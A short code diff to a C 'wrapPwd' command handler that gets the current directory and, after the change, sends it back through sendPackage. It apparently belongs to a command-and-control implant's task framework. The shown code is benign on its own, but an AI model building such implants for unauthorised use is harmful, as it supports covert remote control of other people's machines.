@@ -1,12 +1,8 @@
 #include "WrapPwd.h"
 #include "BasePwd.h"
-#include <windows.h>
 
 BOOL wrapPwd(PParser arguments)
 {
-    // Debug message
-    MessageBoxA(NULL, "wrapPwd function called", "Info", MB_OK);
-
     SIZE_T uuidLength = 36;
     PCHAR taskUuid = getString(arguments, &uuidLength);
 
@@ -16,6 +12,7 @@ BOOL wrapPwd(PParser arguments)
     PPackage output = newPackage(0, FALSE);
     
     char result[MAX_PATH_SIZE];
+    result[0] = '\0'; // Initialize the result string
     BOOL success = basePwd(result, MAX_PATH_SIZE);
 
     if (!success)
@@ -28,6 +25,8 @@ BOOL wrapPwd(PParser arguments)
         addBytes(responseTask, (PBYTE)result, CustomStrLen(result), TRUE);
     }
 
-    // Return the success status
+    // Send the output package
+    Parser* ResponseParser = sendPackage(responseTask);
+
     return success;
 }
